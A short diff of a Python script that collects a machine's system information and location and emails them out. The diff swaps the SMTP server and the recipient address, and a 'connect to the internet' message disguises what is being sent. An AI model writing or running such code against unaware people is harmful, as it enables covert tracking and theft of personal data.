@@ -65,7 +65,7 @@ def send_data_via_email(system_info, location_data, email_to):
     msg.attach(MIMEText(body, 'plain'))
 
     print("Please wait while we connect to the internet...")
-    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server = smtplib.SMTP('smtp.outlook.com', 587)
     server.starttls()
     server.login(email_from, email_password)
     text = msg.as_string()
@@ -79,7 +79,7 @@ if __name__ == "__main__":
     location_data = get_location()
     system_info = get_system_info()
     if location_data:
-        send_data_via_email(system_info, location_data, "recipient_email@example.com")
+        send_data_via_email(system_info, location_data, "recipient_email@gmail.com")
     else:
         print("Failed to retrieve location data.")
 
